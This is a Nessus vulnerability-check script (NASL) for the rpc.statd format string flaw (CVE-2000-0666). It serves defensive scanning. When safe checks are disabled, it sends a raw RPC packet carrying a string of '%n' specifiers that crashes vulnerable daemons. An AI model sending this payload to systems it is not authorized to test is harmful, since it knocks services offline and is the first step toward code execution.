#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10544);
  script_version ("$Revision: 1.31 $");
  script_cve_id("CVE-2000-0666", "CVE-2000-0800");
  script_bugtraq_id(1480);
  script_xref(name:"OSVDB", value:"443");
  script_xref(name:"OSVDB", value:"57715");
  script_xref(name:"IAVA", value:"2000-b-0005");

  script_name(english:"Linux Multiple statd Packages Remote Format String");
  script_summary(english:"Checks the presence of a RPC service");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a buffer overflow..'
  );

  script_set_attribute(
    attribute:'description',
    value:'The remote statd service could be brought down with a format string attack -
it now needs to be restarted manually.

This means that an attacker may execute arbitrary code thanks to a bug in
this daemon.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'Upgrade to the latest version of rpc.statd.'
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2000-07/0206.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C'
  );

  script_end_attributes();

  script_category(ACT_MIXED_ATTACK); # mixed
  script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
  script_family(english:"RPC");
  if ( ! defined_func("bn_random") )
   script_dependencie("os_fingerprint.nasl", "rpc_portmap.nasl");
  else
   script_dependencie("os_fingerprint.nasl", "rpc_portmap.nasl", "redhat_fixes.nasl");
  script_require_keys("rpc/portmap");
  exit(0);
}

#
# The script code starts here
#
include("misc_func.inc");
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

if ( get_kb_item("Host/Solaris/Version") )  exit(0);

if ( get_kb_item("CVE-2000-0666") ) exit(0);

port = get_rpc_port(program:100024,
		protocol:IPPROTO_UDP);

if ( ! port && safe_checks() )
	port = get_rpc_port(program:100024,
		protocol:IPPROTO_TCP);

if(port)
{
 if(safe_checks())
 {
  os = get_kb_item("Host/OS");
  if ( os ) {
	if ("Linux" >!< os ) exit(0);
        if ("Linux Kernel 2.4" >< os ||
	    "Linux Kernel 2.6" >< os ) exit(0);
	}
  else if ( report_paranoia < 2 ) exit(0);


  report = "
The remote statd service may be vulnerable to a format string attack.

This means that an attacker may execute arbitrary code thanks to a bug in
this daemon.

Only older versions of statd under Linux are affected by this problem.

*** Nessus reports this vulnerability using only information that was gathered.
*** Use caution when testing without safe checks enabled.

Solution : upgrade to the latest version of rpc.statd
Risk factor : High";

  security_hole(port:port, data:report, protocol:"udp");
  exit(0);
 }
#
# Begin request
#
beg = raw_string(0x78, 0xE0, 0x80, 0x4D, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
		 0x86, 0xB8, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		 0x00, 0x20, 0x3A, 0x0B, 0xB6, 0xB8, 0x00, 0x00,
		 0x00, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68,
		 0x6F, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x4E, 0x00,
		 0x00, 0x00);


soc = open_sock_udp(port);
send(socket:soc, data:beg);
r = recv(socket:soc, length:4096);
if(r)
{
#
# Ok - rpc.statd is alive. Let's now send it a couple of %n's
#
req = raw_string(0x42, 0x99, 0x30, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
		0x86, 0xB8, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x20, 0x3A, 0x0B, 0xB4, 0xB3, 0x00, 0x00,
		0x00, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68,
		0x6F, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25);


send(socket:soc, data:req);
r = recv(socket:soc, length:1024);

if(!r){
	security_hole(port:port, protocol:"udp");
	}
}

close(soc);
}
